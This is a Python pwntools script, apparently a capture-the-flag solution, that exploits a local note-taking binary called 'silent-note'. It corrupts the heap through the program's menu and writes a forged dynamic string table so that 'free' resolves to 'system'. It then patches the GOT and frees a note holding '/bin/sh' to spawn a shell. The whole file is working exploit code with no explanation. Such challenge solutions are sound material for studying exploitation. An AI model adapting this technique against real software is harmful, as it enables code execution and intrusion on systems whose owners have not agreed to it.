#!/usr/bin/python
# -*- coding: utf8 -*-

from __future__ import print_function
from pwn import *

context.log_level="debug"

fn = "./silent-note"

elf = ELF(fn)
io = process(fn)

def new_note(size, content):
    io.sendline("1")
    io.sendline(str(size))
    io.send(content)

def edit_note(index, content):
    io.sendline("2")
    io.sendline(str(index))
    io.send(content)

def delete_note(index):
    io.sendline("3")
    io.sendline(str(index))



new_note(128, b"a" * 128)  # note 0
new_note(128, b"b" * 128)  # note 1
new_note(8, "/bin/sh\x00")  # note 2
delete_note(0)
delete_note(1)
pause()
new_note(16, p64(256) + p64(elf.bss() + 0x800))
pause()
payload = b'\x00libc.so.6\x00exit\x00__isoc99_scanf\x00__stack_chk_fail\x00stdin\x00calloc\x00memset\x00read\x00stdout\x00mprotect\x00stderr\x00setvbuf\x00__libc_start_main\x00system\x00'.ljust(256, 'c')
edit_note(0, payload)
edit_note(3, p64(8) + p64(0x4032a0))  # DT_STRTAB
edit_note(0, p64(elf.bss() + 0x800))
edit_note(3, p64(8) + p64(elf.got['free']))
edit_note(0, p64(elf.plt['free']))
delete_note(2)

io.interactive()
